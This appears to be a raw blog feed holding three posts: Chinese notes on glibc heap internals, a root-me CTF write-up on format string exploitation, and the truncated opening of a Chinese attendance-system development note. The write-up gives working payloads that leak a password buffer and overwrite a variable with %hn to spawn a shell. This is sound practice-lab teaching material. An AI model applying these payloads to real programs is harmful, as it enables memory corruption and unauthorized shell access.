&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;/* A heap is a single contiguous memory region holding (coalesceable)
   malloc_chunks.  It is allocated with mmap() and always starts at an
   address aligned to HEAP_MAX_SIZE.  */

typedef struct _heap_info
{
  mstate ar_ptr; /* Arena for this heap. */
  struct _heap_info *prev; /* Previous heap. */
  size_t size;   /* Current size in bytes. */
  size_t mprotect_size; /* Size in bytes that has been mprotected
                           PROT_READ|PROT_WRITE.  */
  /* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */
  char pad[-6 * SIZE_SZ &amp;amp; MALLOC_ALIGN_MASK];
} heap_info;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;http://ftp.gnu.org/gnu/glibc/&quot;&gt;来源:glibc2.27/malloc/arena.c&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;malloc_state&quot;&gt;malloc_state&amp;mdash;&amp;mdash;arena header&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

#if THREAD_STATS
  /* Statistics for locking.  Only used if THREAD_STATS is defined.  */
  long stat_lock_direct, stat_lock_loop, stat_lock_wait;
#endif

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  */
  struct malloc_state *next_free;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
/*
    mutex：用于支持多线程的互斥锁
    fastbinsY[FASTBINS]：fastbin指针数组
    top：指向top chunk指针
    last_remainder：remainder
    bins[NBINS * 2 - 2]：bins指针数组


*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;http://ftp.gnu.org/gnu/glibc/&quot;&gt;来源:glibc2.27/malloc/malloc.c&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;malloc_state_member&quot;&gt;malloc_state成员&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;top chunk是arena高地址处的一个chunk，当所有bin都无法满足分配要求时便判断top chunk的大小是否符合分配要求，若满足则拆分top chunk为新分配的空间和新的top chunk；否则，进行堆拓展。&lt;/li&gt;
&lt;li&gt;last remainder chunk是当请求一个small chunk而small bins和unsorted bins均无符合要求的chunk时由binmaps遍历bin寻找最合适的chunk，切分该chunk时如有剩余则作为新chunk加入unsorted bin，此时便成为last remainder chunk。当再次申请small chunk且small bins无合适chunk则搜索unsorted bin，若恰好last remainder chunk满足分配要求则对其切分，若有剩余那么剩余部分作为新的unsorted bins中的last remainder chunk。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a name=&quot;bin&quot;&gt;bin&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;fastbins
&lt;ul&gt;
&lt;li&gt;16~64B(for 32bit);32~128B(for 64bit)&lt;/li&gt;
&lt;li&gt;LIFO;单链表&lt;/li&gt;
&lt;li&gt;不合并&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;bins
&lt;ul&gt;
&lt;li&gt;循环双链表&lt;/li&gt;
&lt;li&gt;bin1 - unsorted bin
&lt;ul&gt;
&lt;li&gt;free small chunk和free large chunk暂时添加到unsorted bin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;bin2 to bin63 - small bin
&lt;ul&gt;
&lt;li&gt;16,24,32,&amp;hellip;,508 bytes(for 32bit),每个bin的chunk大小相同&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;bin64 to bin126 - large bin
&lt;ul&gt;
&lt;li&gt;&gt;=512 bytes(for 32bit) &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a name=&quot;malloc_chunk&quot;&gt;malloc_chunk&amp;mdash;&amp;mdash;chunk header&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};


/*

chunk8字节对齐

allocated chunk:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

        A:NON_MAIN_ARENA
        M:IS_MAPPED
        P:PRE_INUSE

freed chunk:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
*/          
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;http://ftp.gnu.org/gnu/glibc/&quot;&gt;来源:glibc2.27/malloc/malloc.c&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a name=&quot;consolidate&quot;&gt;consolidate&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;针对non mapped chunks&lt;/p&gt;
&lt;h4&gt;&lt;a name=&quot;consolidate_forward&quot;&gt;consolidate forward&lt;/a&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;    if (nextchunk != av-&gt;top) {
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      if (!nextinuse) {
        size += nextsize;
        unlink(av, nextchunk, bck, fwd);
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      first_unsorted = unsorted_bin-&gt;fd;
      unsorted_bin-&gt;fd = p;
      first_unsorted-&gt;bk = p;

      if (!in_smallbin_range (size)) {
        p-&gt;fd_nextsize = NULL;
        p-&gt;bk_nextsize = NULL;
      }

      set_head(p, size | PREV_INUSE);
      p-&gt;bk = unsorted_bin;
      p-&gt;fd = first_unsorted;
      set_foot(p, size);
    }

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av-&gt;top = p;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;if &lt;code&gt;PREV_INUSE&lt;/code&gt; is set:
&lt;ul&gt;
&lt;li&gt;p-&gt;next is a top chunk:
&lt;ol&gt;
&lt;li&gt;p-&gt;size += nextsize&lt;/li&gt;
&lt;li&gt;当前chunk p成为新top chunk&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;p-&gt;next is not a top chunk:
&lt;ul&gt;
&lt;li&gt;p-&gt;next-&gt;next-&gt;PRE_INUSE is set:
&lt;ol&gt;
&lt;li&gt;p-&gt;size += p-&gt;next-&gt;size&lt;/li&gt;
&lt;li&gt;unlink&lt;/li&gt;
&lt;li&gt;move into unsorted bins&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a name=&quot;consolidate_backward&quot;&gt;consolidate backward&lt;/a&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;if &lt;code&gt;PREV_INUSE&lt;/code&gt; is set:
&lt;ol&gt;
&lt;li&gt;p-&gt;size += p-&gt;prev-&gt;size&lt;/li&gt;
&lt;li&gt;unlink&lt;/li&gt;
&lt;li&gt;move into unsorted bins&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a name=&quot;unlink&quot;&gt;unlink&lt;/a&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \
    FD = P-&gt;fd;                                   \
    BK = P-&gt;bk;                                   \

    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))             \
      malloc_printerr (&quot;corrupted double-linked list&quot;);               \


    else {                                    \
        FD-&gt;bk = BK;                                  \
        BK-&gt;fd = FD;                                  \
        if (!in_smallbin_range (chunksize_nomask (P))                 \
            &amp;amp;&amp;amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {            \
        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \
        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
          malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   \
            if (FD-&gt;fd_nextsize == NULL) {                    \
                if (P-&gt;fd_nextsize == P)                      \
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             \
                else {                                \
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 \
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 \
                  }                               \
              } else {                                \
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             \
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             \
              }                                   \
          }                                   \
      }                                       \
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3~4行对p-&gt;next-&gt;size和p-&gt;size进行一致性检查&lt;/li&gt;
&lt;li&gt;8~9和17~19行对即将unlink的chunk进行防伪造检查&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://manybutfinite.com/post/how-the-kernel-manages-your-memory/&quot;&gt;How The Kernel Manages Your Memory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/&quot;&gt;heap overflow using unlink&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/53850&quot;&gt;Linux堆内存管理深入分析 (上)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/53852&quot;&gt;Linux堆内存管理深入分析 (下)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSAPP #9.9动态内存管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://ftp.gnu.org/gnu/glibc&quot;&gt;glibc2.27/malloc.c &amp;amp; arena.c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>DoubleMice</name></author><summary type="html">目的 熟悉堆内存布局 了解glibc(ptmalloc2)堆管理机制 目录 内存管理函数 虚拟内存布局 mmap&amp;amp;munmap brk&amp;amp;sbrk malloc&amp;amp;free 应用程序动态申请内存 glibc堆管理机制 heap_info malloc_state malloc_state成员 bin malloc_chunk consolidate consolidate forward consolidate backward unlink 内存管理函数 虚拟内存布局 图片来源：sploitfun mmap&amp;amp;munmap 系统调用 void *mmap(void *addr, size_t length, int prot, int flags,int fd, off_t offset); /* addr: NONE|addr NONE:操作系统选择创建虚拟内存区域的位置 somewhere:操作系统从addr附近页边界处创建虚拟内存区域(linux) length:申请的字节数 prot:PROT_NONE|PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE PROT_EXEC:页可执行 PROT_READ:页可读 PROT_WRITE:页可写 PROT_NONE:页不可访问 flags:MAP_SHARED|MAP_PRIVATE|MAP_ANONYMOUS|... MAP_SHARED:虚拟内存区域可共享 MAP_PRIVATE:私有虚拟内存区域 MAP_ANONYMOUS:虚拟内存区域初始化为0，如果同时被设置为MAP_ANONYMOUS，fd应为-1 fd:文件描述符，指定要映射的对象的一个连续片段，长度为length字节 offset:文件开始的偏移处开始映射</summary></entry><entry><title type="html">root-me:Format string bug</title><link href="http://localhost:4000/pwn/root-me/2018/01/28/format-string-bug.html" rel="alternate" type="text/html" title="root-me:Format string bug" /><published>2018-01-28T22:34:44+08:00</published><updated>2018-01-28T22:34:44+08:00</updated><id>http://localhost:4000/pwn/root-me/2018/01/28/format-string-bug</id><content type="html" xml:base="http://localhost:4000/pwn/root-me/2018/01/28/format-string-bug.html">&lt;p&gt;I'd stayed away from pwn for several months because of my own fucking thoughts.&lt;br /&gt;
These days i was dived into ICS program assignment again and it's make me so gloomy.&lt;br /&gt;
To get more funny,the article appeared.&lt;br /&gt;
The article is aimed at summarizing the general way to exploit format string bugs.&lt;br /&gt;
All the challenges could be found on &lt;a href=&quot;https://root-me.org&quot;&gt;root-me.org&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Attachment&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://403forbidden.website/wp-content/uploads/2018/02/EN-Introduction-to-format-string-exploits.pdf&quot;&gt;N-Introduction-to-format-string-exploits&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://403forbidden.website/wp-content/uploads/2018/01/EN-Format-Bugs-Exploiting-format-string.pdf&quot;&gt;EN - Format Bugs - Exploiting format string&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Content&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#elf-86-b-1&quot;&gt;ELF x86 - Format string bug basic 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elf-86-b-2&quot;&gt;ELF x86 - Format string bug basic 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elf-86-b-3&quot;&gt;ELF x86 - Format String Bug Basic 3&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;FLAG~FLAG~FLAG~&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#elf-86-remote&quot;&gt;ELF x86 - Remote Format String bug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elf-86-blind-remote&quot;&gt;ELF x86 - Blind remote format string bug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elf-arm-heap-string&quot;&gt;ELF ARM - Heap format string bug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#elf-arm-format&quot;&gt;ELF ARM - Format String bug&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a name=&quot;elf-86-b-1&quot;&gt;ELF x86 - Format string bug basic 1&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;It is the time i feel i am very stupid...Let's see the code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char *argv[]){
    FILE *secret = fopen(&quot;/challenge/app-systeme/ch5/.passwd&quot;, &quot;rt&quot;);
    char buffer[32];
    fgets(buffer, sizeof(buffer), secret);
    printf(argv[1]);
    fclose(secret);
    return 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It's extremely simple,right?&lt;br /&gt;
We know the &lt;code&gt;buffer&lt;/code&gt; is always on the stack,no matter how the stack changed&lt;br /&gt;
so we just print enough stack frame,&lt;br /&gt;
then adjust them into little-endient,&lt;br /&gt;
transfer them into ascii,&lt;br /&gt;
and the printable characters are our answer.&lt;/p&gt;
&lt;p&gt;A wonderful script from Internet:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -e $(./ch5 $(python -c 'print &quot;%08x&quot; * 20') | sed -r '
        # little-endian architecture, reorder bytes
        s/(..)(..)(..)(..)//g
        # preceed every byte by \x so it will be
        # interpreted by echo -e
        s/(..)/\x&amp;amp;/g
    ' ) | grep -Pazo '[[:print:]]{13}\n'
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a name=&quot;elf-86-b-2&quot;&gt;ELF x86 - Format string bug basic 2&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;What we should notice is that character '$' must be escaped with '\'&lt;/p&gt;
&lt;p&gt;the push order of the params of &lt;code&gt;printf()&lt;/code&gt;,for example:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;printf(&quot;Color %s, Number %d, Float %4.2f&quot;, color, num, f_num);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the stack layout is:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;[stack  bottom]
[ f_num value ]
[  num value  ]
[ color value ]
[format string]
[  stack top  ]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ch14:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
/*
gcc -m32 -o ch14 ch14.c
*/
int main( int argc, char ** argv )
{

        int var;
        int check  = 0x04030201;
        char fmt[128];
        if (argc &lt;2)
                exit(0);
        memset( fmt, 0, sizeof(fmt) );
        printf( &quot;check at 0x%x\n&quot;, &amp;amp;check );
        printf( &quot;argv[1] = [%s]\n&quot;, argv[1] );
        snprintf( fmt, sizeof(fmt), argv[1] );
        if ((check != 0x04030201) &amp;amp;&amp;amp; (check != 0xdeadbeef))
                printf (&quot;\nYou are on the right way !\n&quot;);
        printf( &quot;fmt=[%s]\n&quot;, fmt );
        printf( &quot;check=0x%x\n&quot;, check );
        if (check==0xdeadbeef)
        {
                printf(&quot;Yeah dude ! You win !\n&quot;);
                system(&quot;/bin/bash&quot;);
        }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;app-systeme-ch14@challenge02:~$ ./ch14 aaaaa
check at 0xbffffb38
argv[1] = [aaaaa]
fmt=[aaaaa]
check=0x4030201

app-systeme-ch14@challenge02:~$ ./ch14 &quot;AAAA %x %x %x %x %x %x %x %x %x %x&quot;
check at 0xbffffb28
argv[1] = [AAAA %x %x %x %x %x %x %x %x %x %x]
fmt=[AAAA b7fdc4a0 1 0 1 bffffc54 0 0 4030201 41414141 66376220]
check=0x4030201

app-systeme-ch14@challenge02:~$ ./ch14 &quot;AAAAaaaa %x %x %x %x %x %x %x %x %x %x&quot;
check at 0xbffffb18
argv[1] = [AAAAaaaa %x %x %x %x %x %x %x %x %x %x]
fmt=[AAAAaaaa b7fdc4a0 1 0 1 bffffc44 0 0 4030201 41414141 61616161]
check=0x4030201
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As we see,&lt;code&gt;AAAA(41414141)&lt;/code&gt; has been recorded at the ninth location after &lt;code&gt;AAAA&lt;/code&gt;&lt;br /&gt;
So we have a methond to write &lt;code&gt;0xdeadbeef&lt;/code&gt; to aim address:&lt;br /&gt;
let it record the check address,write the aim value to check address use &lt;code&gt;%?$n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%?$n&lt;/code&gt;:the length of last output as input,write to ?th param&lt;/p&gt;
&lt;p&gt;After this,its layout will be:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fmt=['beef address,dead address' b7fdc4a0 1 0 1 bffffc44 0 0 4030201 'beef address' 'dead address']
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./ch14 $(python -c &quot;print '\x28\xfb\xff\xbf'+'\x2a\xfb\xff\xbf'+'%48871x%9\$hn'+'%8126x%10\$hn'&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;0xdeadbeef&lt;/code&gt; is too large when as a decimal value,we have to devide it into &lt;code&gt;0xbeef&lt;/code&gt; and &lt;code&gt;0xdead&lt;/code&gt;.The machine is little-endient,so &lt;code&gt;0xbeef&lt;/code&gt; is at the ninth one and &lt;code&gt;0xdead&lt;/code&gt; is at the tenth one.&lt;br /&gt;
&lt;code&gt;h&lt;/code&gt; means 'half of machine word',the machine word of training machine is 32 bits.&lt;/p&gt;
&lt;p&gt;(#@2017.12)&lt;/p&gt;
&lt;h2&gt;&lt;a name=&quot;elf-86-b-3&quot;&gt;ELF x86 - Format string bug basic 3&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;no idea yet&lt;/p&gt;</content><author><name>DoubleMice</name></author><summary type="html">I'd stayed away from pwn for several months because of my own fucking thoughts. These days i was dived into ICS program assignment again and it's make me so gloomy. To get more funny,the article appeared. The article is aimed at summarizing the general way to exploit format string bugs. All the challenges could be found on root-me.org Attachment N-Introduction-to-format-string-exploits EN - Format Bugs - Exploiting format string Content ELF x86 - Format string bug basic 1 ELF x86 - Format string bug basic 2 ELF x86 - Format String Bug Basic 3 &amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;FLAG~FLAG~FLAG~&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr;&amp;darr; ELF x86 - Remote Format String bug ELF x86 - Blind remote format string bug ELF ARM - Heap format string bug ELF ARM - Format String bug ELF x86 - Format string bug basic 1 It is the time i feel i am very stupid...Let's see the code: #include #include</summary></entry><entry><title type="html">一个考勤系统的开发笔记</title><link href="http://localhost:4000/%E5%BC%80%E5%8F%91/2018/01/23/dutysystem.html" rel="alternate" type="text/html" title="一个考勤系统的开发笔记" /><published>2018-01-23T19:40:08+08:00</published><updated>2018-01-23T19:40:08+08:00</updated><id>http://localhost:4000/%E5%BC%80%E5%8F%91/2018/01/23/dutysystem</id><content type="html" xml:base="http://localhost:4000/%E5%BC%80%E5%8F%91/2018/01/23/dutysystem.html">&lt;h1&gt;DutySystem&lt;/h1&gt;
&lt;p&gt;开发周期7月20号到8月1号，8月20号到8月25号左右&lt;/p&gt;
&lt;p&gt;A duty system for xxxxxxx.&lt;/p&gt;
&lt;p&gt;&lt;!-- vscode-markdown-toc --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Initialize&quot;&gt;Initialize&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#MySQLauthentication&quot;&gt;MySQL authentication&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Model&quot;&gt;Model&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;3.1. &lt;a href=&quot;#ModelRelationship&quot;&gt;Model Relationship&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Controller&quot;&gt;Controller&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Middleware&quot;&gt;Middleware&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#API&quot;&gt;API&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Databasetables&quot;&gt;Database tables&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;7.1. &lt;a href=&quot;#tablename:employees&quot;&gt;table name: &lt;code&gt;employees&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;7.2. &lt;a href=&quot;#tablenames:records&quot;&gt;table names: &lt;code&gt;records&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;7.3. &lt;a href=&quot;#tablename:users&quot;&gt;table name: &lt;code&gt;users&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;7.4. &lt;a href=&quot;#tablename:user_action_records&quot;&gt;table name: &lt;code&gt;user_action_records&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Migrations&quot;&gt;Migrations&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Seeds&quot;&gt;Seeds&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#EmployeeStatus&quot;&gt;Employee Status&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#ImportantTimestamp&quot;&gt;Important Timestamp&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;11.1. &lt;a href=&quot;#DefaultTimezone&quot;&gt;Default Timezone&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#Schedulingtask&quot;&gt;Scheduling task&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#note&quot;&gt;note&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;13.1. &lt;a href=&quot;#Errormessage:&quot;&gt;Error message:&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;13.2. &lt;a href=&quot;#Solution&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
